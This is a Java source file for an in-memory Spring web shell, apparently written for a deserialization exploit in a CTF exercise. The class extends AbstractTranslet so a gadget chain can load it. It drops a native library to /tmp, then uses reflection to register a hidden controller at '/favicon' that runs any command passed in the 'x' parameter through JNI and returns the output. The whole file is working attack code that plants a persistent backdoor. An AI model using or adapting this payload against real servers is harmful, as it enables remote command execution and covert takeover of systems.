import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Map;

@RestController
public class MSpringJNIController extends AbstractTranslet {
    public native String doExec(String cmd);
    public MSpringJNIController() throws Exception {
        // write so
        String str = "";
        File f = new File("/tmp/libcmd.so");
        FileOutputStream fos = new FileOutputStream(f);
        fos.write(Base64.getDecoder().decode(str));
        fos.flush();
        fos.close();

        final String controllerPath = "/favicon";
        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MSpringJNIController.class.getDeclaredMethod("index");
        Field mapfield = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
        mapfield.setAccessible(true);
        Object mr = mapfield.get(r);
        Class<?> mrclazz = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Method mrms = mrclazz.getDeclaredMethod("register", Object.class, Object.class, Method.class);
        Field lookupfield = null;
        try {
            lookupfield = mrclazz.getDeclaredField("urlLookup");
            lookupfield.setAccessible(true);
        }catch (NoSuchFieldException e){
            lookupfield = mrclazz.getDeclaredField("pathLookup");
            lookupfield.setAccessible(true);
        }
        Map<String, Object> urlLookup = (Map<String, Object>) lookupfield.get(mr);
        for (String urlPath : urlLookup.keySet()) {
            if (controllerPath.equals(urlPath)) {
                throw new Exception("controller url path exist already");
            }
        }
        // 2.6.6写法
        RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
        option.setPatternParser(new PathPatternParser());
        RequestMappingInfo info = RequestMappingInfo.paths(controllerPath).options(option).build();
        mrms.setAccessible(true);
        // 免进入实例创建的死循环
        MSpringJNIController mem = new MSpringJNIController("aaa");
        mrms.invoke(mr, info, mem, method);
    }

    public MSpringJNIController(String aaa){}

    public void index() throws Exception{
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            String arg0 = request.getParameter("x");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                // liunx
                System.load("/tmp/libcmd.so");
                // windows
//                System.load("D:\\safetool\\Tools\\webleak\\POC\\Exploit\\java\\javatest\\2022MRCTF\\kryo反序列化\\code\\src\\main\\java\\libcmd.dll");
                MSpringJNIController jni = new MSpringJNIController("aaa");
                String content = jni.doExec(arg0);
                writer.println(content);
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}